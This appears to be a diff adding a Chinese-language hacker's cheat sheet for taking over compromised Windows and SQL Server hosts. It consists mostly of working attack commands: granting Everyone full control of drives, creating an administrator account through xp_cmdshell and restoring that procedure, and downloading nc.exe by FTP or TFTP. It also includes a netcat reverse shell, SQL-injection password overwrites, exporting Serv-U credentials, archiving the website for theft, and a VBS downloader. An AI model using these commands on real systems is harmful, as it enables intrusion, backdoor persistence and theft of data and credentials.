@@ -1,0 +1,115 @@
+权限设置
+cacls.exe c: /e /t /g everyone:F #把c盘设置为everyone可以浏览
+cacls.exe d: /e /t /g everyone:F #把d盘设置为everyone可以浏览
+cacls.exe e: /e /t /g everyone:F #把e盘设置为everyone可以浏览
+cacls.exe f: /e /t /g everyone:F #把f盘设置为everyone可以浏览
+cacls d:\website /g everyone /e /t授与完全控制
+cacls d:\website /r everyone /e /t取消完全控制
+SA加系统用户
+exec master.dbo.xp_cmdshell 'net user admin admin /add'
+
+exec master.dbo.xp_cmdshell 'net localgroup administrators admin /add'
+
+恢复扩散
+dbcc addextendedproc ("sp_OACreate","odsole70.dll")
+dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
+
+如果恢复不了的解释:
+因为管理员是直接删除dll文件，而没删除存储过程，你这样恢复肯定是提示存储过程已存在了。你要先删除存储过程，use master
+EXEC sp_dropextendedproc 'xp_cmdshell'
+
+然后上传xplog70.dll到某个目录，例如C盘根目录，然后执行
+use master dbcc addextendedproc('xp_cmdshell','c:\xplog70.dll')
+就可以使用cmdshell存储过程执行系统指令了。
+
+MB的没想到网关都能用NB这样设..落伍啦.落伍啦
+把他设置成网关看看行不行.在NBSI执行命令那里输入：echo interface ip >ip.txt
+echo set address "Backup" static 10.90.90.157 255.255.255.0 10.90.90.14 1 >>ip.txt
+netsh exec ip.txt
+这样就把网关设置为10.90.90.14了，然后我们ipconfig看看是不是有网关了，
+
+echo interface ip >1.txt
+echo set address "本地连接" static 192.168.1.2 255.255.255.0 192.168.1 254 1 >>1.txt
+netsh exec 1.txt
+
+address"本地连接的名称" 可以用ipconfig得到. static IP地址 子网掩码网关地址。
+好了现在我PING下163看看能不能PING通，如图8
+
+命令行FTP下载文件
+echo open ip >11.txt
+echo user >>11.txt
+echo pass >>11.txt
+echo get nc.exe >>11.txt
+echo bye >>11.txt
+ftp -s:11.txt
+
+NC做反弹SHELL
+在本地监听1234端口 nc -vv -l -p 1234
+
+然后在NBSI执行命令那里nc -e cmd.exe ip 1234
+
+改密码地
+http://注入网址;update admin set password='新MD5密码' where password='旧MD5密码'-- [admin为表名.]
+
+查看系统在线用户
+query user
+注销用户
+logoff
+D:\web\rar.exe a -k -r -s -m1 D:\web\zhu.rar D:\web\
+把站点打包到zhu.rar里，
+
+参数说明:
+
+a 添加文件到压缩文件中
+
+-k 锁定压缩文件
+
+-s产生固体存档,这样可以增大压缩比
+
+-r包括子目录
+
+-m1 设置压缩比
+
+-m0 存储 添加到压缩文件时不压缩文件。
+-m1 最快 使用最快方式(低压缩)
+-m2 较快 使用快速压缩方式
+-m3 标准 使用标准(默认)压缩方式
+-m4 较好 使用较好压缩方式(较好压缩，但是慢)
+-m5 最好 使用最大压缩方式(最好的压缩，但是最慢
+
+直接 D:\web\rar.exe a -r D:\web\zhu.rar D:\web\ 效果一样
+
+exec xp_cmdshell 'echo 内容 >>绝对路径'
+
+sc stop MSSQLSERVER
+sc config MSSQLSERVER start= disabled
+
+导SERV-U用户.和密码,不过现在版本密码加密了``
+
+regedit /e "D:\hosting\wwwroot\systones_com\htdocs\su.ini" "HKEY_LOCAL_MACHINE\SOFTWARE\cat soft\serv-u\"
+
+导入是regedit /s xx.reg
+
+端口:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp
+
+tftp -i serverip get xx.exe
+
+TFTP –I 127.0.0.1 get common.dll c:\common.dll
+
+VBS
+--
+Set xPost = createObject("Microsoft.XMLHTTP")
+xPost.Open "GET","http://127.0.0.1/u.txt",0 '下载文件的地址
+xPost.Send()
+Set sGet = createObject("ADODB.Stream")
+sGet.Mode = 3
+sGet.Type = 1
+sGet.Open()
+sGet.Write(xPost.responseBody)
+sGet.SaveToFile "c:\jp.exe",2
+
+VPN
+关防火和Application Layer Gateway Service
+
+3389登陆
+mstsc /console /v:IP:终端端口
